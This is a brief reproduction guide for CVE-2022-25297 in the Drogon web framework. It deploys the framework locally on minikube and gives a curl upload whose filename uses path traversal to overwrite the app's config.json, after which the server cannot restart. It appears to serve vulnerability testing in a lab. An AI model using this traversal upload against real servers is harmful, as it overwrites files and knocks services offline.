## CVE-2022-25297
Target Application: Drogon \
Used PoCs: 
* https://security.snyk.io/vuln/SNYK-UNMANAGED-DROGONFRAMEWORKDROGON-2407243

### Steps to Reproduce

1- `minikube start` \
2- `kubectl apply -f drogon-deployment.yaml` \
3- Forward port `kubectl port-forward pods/drogon.... 8848:8848` \
4- Run`curl -F "data=@fake_config.json;filename=../../../../../app/config.json" http://0.0.0.0:8848/upload_endpoint` \
5- Server restarts and can't get started. 
